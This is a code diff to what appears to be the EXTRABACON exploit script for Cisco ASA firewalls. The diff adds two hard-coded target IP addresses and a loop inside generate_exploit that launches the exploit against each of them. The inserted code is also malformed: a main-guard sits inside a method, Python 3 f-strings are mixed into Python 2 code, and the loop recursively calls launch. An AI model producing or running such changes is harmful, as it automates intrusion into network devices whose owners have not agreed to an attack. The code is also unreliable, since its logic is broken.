@@ -9,6 +9,7 @@ import datetime
 
 sc_dir = "./shellcode"
 vers_dir = "./versions"
+target_ips = ['10.72.218.66', '10.62.252.214']
 
 sys.path.insert(0, '..')
 from Mexeggs.all import *
@@ -273,6 +274,12 @@ class Extrabacon(Sploit):
 
     def generate_exploit(self):
         ##
+        if __name__ == '__main__':
+            exp = Extrabacon('Extrabacon', '1.1.0.1')
+        for ip in target_ips:
+            print(f"Launching exploit against {ip}")
+            exp.params.target = ip  # Ensure this aligns with how your script sets the target
+            exp.launch(sys.argv)
 
         if not self.params.mode:
             print "[-] no mode selected!"
@@ -353,6 +360,7 @@ class Extrabacon(Sploit):
             sys.exit(1)
 
         ##
+
         ##
 
         ##
